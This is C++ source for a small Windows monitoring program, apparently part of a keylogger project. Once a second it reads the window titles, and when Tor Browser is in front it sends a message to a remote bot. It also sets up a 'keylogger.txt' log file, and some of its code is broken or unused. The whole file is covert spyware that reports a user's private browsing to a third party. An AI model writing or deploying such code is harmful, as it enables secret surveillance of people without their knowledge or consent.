#include <iostream>
#include <fstream>
#include <vector>
#include "HTTPReqRes.h"
#define LOG_FILE "keylogger.txt"

BOOL CALLBACK speichereFenster(HWND hwnd, LPARAM lParam) {
  const DWORD TITLE_SIZE = 1024;
  WCHAR windowTitle[TITLE_SIZE];

  GetWindowTextW(hwnd, windowTitle, TITLE_SIZE);

  int length = ::GetWindowTextLength(hwnd);
  wstring title(&windowTitle[0]);
  if (!IsWindowVisible(hwnd) || length == 0 || title == L"Program Manager") {
    return TRUE;
  }
  vector<wstring>& titles = *reinterpret_cast<vector<wstring>*>(lParam);
  titles.push_back(title);

  return TRUE;
}

void saveData(string data)
{
  fstream logFile;
  logFile.open(LOG_FILE, ios::app);
  logFile << data;
  logFile.close();
}

int main()
{
  wchar_t message[] = L"user opened tor browser";
  const wstring titleToCheck = L"Tor Browser";
  HTTPReqRes httpReqRes;

  while (1)
  {
    vector<wstring> titles;
    EnumWindows(speichereFenster, reinterpret_cast<LPARAM>(&titles));
    if (titles[0] == titleToCheck)
    {
      cout << "USER WORKING IN TOR" << endl;
      wcout << titles[0] << endl;
      httpReqRes.sendMessageToBot();
      //listenForProcess = false;
    }
    Sleep(1000);
  }
}